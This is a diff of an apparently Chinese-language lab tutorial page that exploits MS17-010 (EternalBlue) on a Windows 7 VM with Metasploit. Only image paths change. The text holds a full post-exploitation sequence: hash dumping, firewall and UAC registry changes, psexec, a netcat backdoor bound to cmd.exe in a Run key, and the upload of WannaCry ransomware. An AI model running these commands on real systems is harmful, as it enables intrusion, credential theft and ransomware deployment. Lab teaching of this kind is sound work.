@@ -486,40 +486,40 @@ ms17-010 简介永恒之蓝(EternalBlue)是由美国国家安全局开发的漏�
 <ol>
 <li><p>查看攻击机 目标机的IP地址</p>
 <p>kali : ifconfig ip: 192.168.44.131</p>
-<p><img src="/.com//001.png"></p>
+<p><img src="/ms17-010/001.png"></p>
 <p>windows : 在 cmd 命令行中输入 ipconfig        查看 ip : 192.168.44.133</p>
-<p><img src="/.com//002.png"></p>
+<p><img src="/ms17-010/002.png"></p>
 </li>
 <li><p>测试两台机器的连通性</p>
 <p>在 kali 中输入 : ping 192.168.44.133</p>
-<p><img src="/.com//003.png"></p>
+<p><img src="/ms17-010/003.png"></p>
 </li>
 <li><p>在 kali 中启动 metasploit ,</p>
 <p>输入命令: msfdb run</p>
-<p><img src="/.com//004.png"></p>
+<p><img src="/ms17-010/004.png"></p>
 </li>
 <li><p>对主机扫描确认是否存在漏洞</p>
 <p>利用 ms7-010 扫描模块去探测目标机是否存在相关的漏漏洞</p>
-<p><img src="/.com//005.png"></p>
+<p><img src="/ms17-010/005.png"></p>
 <p>由图可得，模块四可进行主机的扫描 使用命令 : use 4</p>
-<p><img src="/.com//006.png"></p>
+<p><img src="/ms17-010/006.png"></p>
 <p>设置RHOSTS ，等相关参数 如</p>
-<p><img src="/.com//007.png"></p>
+<p><img src="/ms17-010/007.png"></p>
 <p>启动命令 即可发现该主机是存在此漏洞的，可进行攻击。</p>
 </li>
 <li><p>利用ms17-010的攻击模块对目标机进行攻击，获取权限</p>
 <p>查看ms17-010 的相关模块的参数</p>
-<p><img src="/.com//008.png"></p>
+<p><img src="/ms17-010/008.png"></p>
 <p>可利用 0 模块进行对目标机的攻击 使用命令 use 0</p>
-<p><img src="/.com//009.png"></p>
+<p><img src="/ms17-010/009.png"></p>
 <p>查看相关的参数，并进行相关的配置 使用命令 : show options</p>
-<p><img src="/.com//010.png"></p>
+<p><img src="/ms17-010/010.png"></p>
 <p>自动生成 payload 也可自定义 一般保持默认</p>
-<p><img src="/.com//011.png"></p>
+<p><img src="/ms17-010/011.png"></p>
 <p>设置 RHOSTS 并对目标及进行渗透 如图：</p>
-<p><img src="/.com//012.png"></p>
+<p><img src="/ms17-010/012.png"></p>
 <p>成功后就可以进入 meterpreter 模块进行后渗透攻击</p>
-<p><img src="/.com//013.png"></p>
+<p><img src="/ms17-010/013.png"></p>
 </li>
 </ol>
 </li>
@@ -527,11 +527,11 @@ ms17-010 简介永恒之蓝(EternalBlue)是由美国国家安全局开发的漏�
 <h4 id="3-ms17-010-漏洞的利用（后渗透攻击）"><a href="#3-ms17-010-漏洞的利用（后渗透攻击）" class="headerlink" title="3. ms17-010 漏洞的利用（后渗透攻击）"></a>3. ms17-010 漏洞的利用（后渗透攻击）</h4><ol>
 <li><p>查看权限</p>
 <p>getuid</p>
-<p><img src="/.com//014.png"></p>
+<p><img src="/ms17-010/014.png"></p>
 </li>
 <li><p>解决乱码 ：</p>
 <p>chcp 65001</p>
-<p><img src="/.com//015.png"></p>
+<p><img src="/ms17-010/015.png"></p>
 </li>
 <li><p>创建一个新用户来远程连接win 7桌面</p>
 <p>RDP : 远程桌面协议（Remote Desktop Protocol）是一个多通道的协议，让用户连接上提供微软终端机服务的电脑，</p>
@@ -539,21 +539,21 @@ ms17-010 简介永恒之蓝(EternalBlue)是由美国国家安全局开发的漏�
 <ol>
 <li><p>开启目标机的RDP协议</p>
 <p>run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</p>
-<p><img src="/.com//016.png"></p>
+<p><img src="/ms17-010/016.png"></p>
 </li>
 <li><p>创建新用户并进行远程连接</p>
-<p><img src="/.com//017.png"></p>
+<p><img src="/ms17-010/017.png"></p>
 </li>
 <li><p>开启远程连接</p>
-<p><img src="/.com//018.png"></p>
+<p><img src="/ms17-010/018.png"></p>
 <p>选择其他用户</p>
-<p><img src="/.com//019.png"></p>
+<p><img src="/ms17-010/019.png"></p>
 <p>输入刚刚创建的用户名和密码 登录</p>
-<p><img src="/.com//020.png"></p>
+<p><img src="/ms17-010/020.png"></p>
 <p>不过对方主机会弹出提示</p>
-<p><img src="/.com//021.png"></p>
+<p><img src="/ms17-010/021.png"></p>
 <p>对方确认后 即可控制对方机器</p>
-<p><img src="/.com//022.png"></p>
+<p><img src="/ms17-010/022.png"></p>
 </li>
 </ol>
 </li>
@@ -561,68 +561,68 @@ ms17-010 简介永恒之蓝(EternalBlue)是由美国国家安全局开发的漏�
 <ol>
 <li><p>SAM ：SAM 文件是账号密码数据库文件，在 C:\Windows\System32\config\SAM</p>
 <p>导出目标机的 hash hashdump</p>
-<p><img src="/.com//023.png"></p>
+<p><img src="/ms17-010/023.png"></p>
 </li>
 <li><p>创建一条防火墙规则，允许4444端口访问网络，否则建立session时 payload 不能通过4444端口访问网络导致session 建立失败</p>
 <p>netsh firewall add portopening TCP 4444 “hahaha” enable all</p>
-<p><img src="/.com//024.png"></p>
+<p><img src="/ms17-010/024.png"></p>
 </li>
 <li><p>关闭UAC</p>
 <p>cmd.exe &#x2F;k %windir%\system32\reg.exe add hklm\software\microsoft\windows\currentversion\policies\system &#x2F;v enablelua &#x2F;t reg_dword &#x2F;d 0 &#x2F;f</p>
-<p><img src="/.com//025.png"></p>
+<p><img src="/ms17-010/025.png"></p>
 </li>
 <li><p>开启目标机的默认共享 （黑客可利用此功能，远程执行命令）</p>
 <p>cmd.exe &#x2F;k %windir%\system32\reg.exe add hklm\software\microsoft\windows\currentversion\policies\system &#x2F;v localaccounttokenfilterpolicy &#x2F;t reg_dword &#x2F;d 1 &#x2F;f</p>
-<p><img src="/.com//026.png"></p>
+<p><img src="/ms17-010/026.png"></p>
 </li>
 <li><p>回退</p>
 <p>exit (输入几次命令 回退几次)</p>
-<p><img src="/.com//027.png"></p>
+<p><img src="/ms17-010/027.png"></p>
 </li>
 </ol>
 </li>
 <li><p>psexec</p>
 <p>将以前的连接保存在后台 background</p>
-<p><img src="/.com//028.png"></p>
+<p><img src="/ms17-010/028.png"></p>
 <p>启用 psexec</p>
 <p>use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</p>
-<p><img src="/.com//029.png"></p>
+<p><img src="/ms17-010/029.png"></p>
 <p>查看相关的配置信息，并输入相关的参数</p>
-<p><img src="/.com//030.png"></p>
-<p><img src="/.com//031.png"></p>
-<p><img src="/.com//032.png"></p>
+<p><img src="/ms17-010/030.png"></p>
+<p><img src="/ms17-010/031.png"></p>
+<p><img src="/ms17-010/032.png"></p>
 <p>执行 run 即可获得权限</p>
-<p><img src="/.com//033.png"></p>
+<p><img src="/ms17-010/033.png"></p>
 </li>
 <li><p>植入后门 修改UAC 的注册表，需重启才能生效</p>
 <p>kali 自带 nc</p>
 <p>ls &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;nc.exe</p>
-<p><img src="/.com//034.png"></p>
+<p><img src="/ms17-010/034.png"></p>
 <p>上传 nc 到目标机</p>
 <p>upload &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;nc.exe C:\windows</p>
-<p><img src="/.com//035.png"></p>
+<p><img src="/ms17-010/035.png"></p>
 <p>查看 nc</p>
-<p><img src="/.com//036.png"></p>
+<p><img src="/ms17-010/036.png"></p>
 <p>注册表添加启动执行nc 反弹shell 命令</p>
 <p>reg setval -k HKLM\software\microsoft\windows\currentversion\run -v lltest_nc -d ‘C:\windows\nc.exe -Ldp 443 -e cmd.exe’</p>
-<p><img src="/.com//037.png"></p>
+<p><img src="/ms17-010/037.png"></p>
 <p>L: 表示用户退出连接后重新进行端口监听</p>
 <p>d: 后台运行</p>
 <p>P : 指定端口</p>
 <p>-e ：程序重定向，一旦连接就执行</p>
 <p>创建防火墙规则，允许 443 端口通过</p>
 <p>netsh firewall add portopening TCP 443 “nc443” enable all</p>
-<p><img src="/.com//039.png"></p>
+<p><img src="/ms17-010/039.png"></p>
 <p>重启</p>
 <p>shutdown -r -f -t 0</p>
-<p><img src="/.com//040.png"></p>
+<p><img src="/ms17-010/040.png"></p>
 <p>重启之后没进入系统 连接就会断</p>
-<p><img src="/.com//041.png"></p>
+<p><img src="/ms17-010/041.png"></p>
 <p>需用户进入系统后，后门程序才可以使用，在锁屏界面无法运行</p>
 </li>
 <li><p>重新连接</p>
 <p>nc -v 192.168.44.133 443</p>
-<p><img src="/.com//042.png"></p>
+<p><img src="/ms17-010/042.png"></p>
 </li>
 <li><p>上传勒索病毒</p>
 <p>upload wannacry .exe C:\</p>
